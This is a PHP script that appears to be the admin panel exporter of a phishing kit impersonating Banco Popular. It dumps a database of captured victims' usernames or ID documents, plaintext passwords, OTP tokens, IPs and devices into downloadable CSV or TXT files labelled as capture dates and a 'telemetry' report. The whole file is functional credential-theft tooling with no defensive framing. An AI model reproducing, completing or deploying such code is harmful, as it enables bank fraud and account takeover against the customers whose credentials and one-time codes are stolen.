<?php
/**
 * ECO / BANCO POPULAR - DATA EXPORTER (CSV / TXT)
 */
require_once __DIR__ . '/../config.php';
checkAdminSession();

$format = strtolower(clean($_GET['format'] ?? 'csv'));
$timestamp = date('Y-m-d_H-i-s');

if ($format === 'txt') {
    header('Content-Type: text/plain; charset=utf-8');
    header('Content-Disposition: attachment; filename=continental_export_' . $timestamp . '.txt');
    header('Pragma: no-cache');
    header('Expires: 0');

    $results = $db->query("SELECT * FROM clients ORDER BY id DESC");
    echo "========================================================\n";
    echo "  PANEL ADMIN - REPORTE DE TELEMETRÍA\n";
    echo "  Fecha de generación: " . date('Y-m-d H:i:s') . "\n";
    echo "========================================================\n\n";

    while ($r = $results->fetchArray(SQLITE3_ASSOC)) {
        echo "ID: #" . $r['id'] . "\n";
        echo "IP: " . $r['ip'] . " (" . ($r['device'] ?? 'Unknown') . ")\n";
        echo "Usuario/Doc: " . $r['user'] . "\n";
        echo "Contraseña: " . $r['pass'] . "\n";
        echo "Token OTP: " . (!empty($r['token']) ? $r['token'] : 'SIN_TOKEN') . "\n";
        echo "Estado: " . $r['status'] . "\n";
        echo "Fecha Registro: " . date('Y-m-d H:i:s', $r['created_at'] ?? $r['last_updated']) . "\n";
        echo "--------------------------------------------------------\n";
    }
    exit;
}

// Default CSV export with UTF-8 BOM for Microsoft Excel
header('Content-Type: text/csv; charset=utf-8');
header('Content-Disposition: attachment; filename=continental_export_' . $timestamp . '.csv');
header('Pragma: no-cache');
header('Expires: 0');

$output = fopen('php://output', 'w');
fprintf($output, chr(0xEF) . chr(0xBB) . chr(0xBF));

fputcsv($output, ['ID', 'Direccion IP', 'Documento / Usuario', 'Contrasena', 'Token OTP', 'Estado', 'Dispositivo', 'Fecha Captura', 'Ultima Actividad']);

$results = $db->query("SELECT id, ip, user, pass, token, status, device, created_at, last_updated FROM clients ORDER BY id DESC");

while ($row = $results->fetchArray(SQLITE3_ASSOC)) {
    fputcsv($output, [
        $row['id'],
        $row['ip'],
        $row['user'],
        $row['pass'],
        $row['token'],
        $row['status'],
        $row['device'] ?? 'Unknown',
        date('Y-m-d H:i:s', $row['created_at'] ?? $row['last_updated']),
        date('Y-m-d H:i:s', $row['last_updated'])
    ]);
}

fclose($output);
exit;
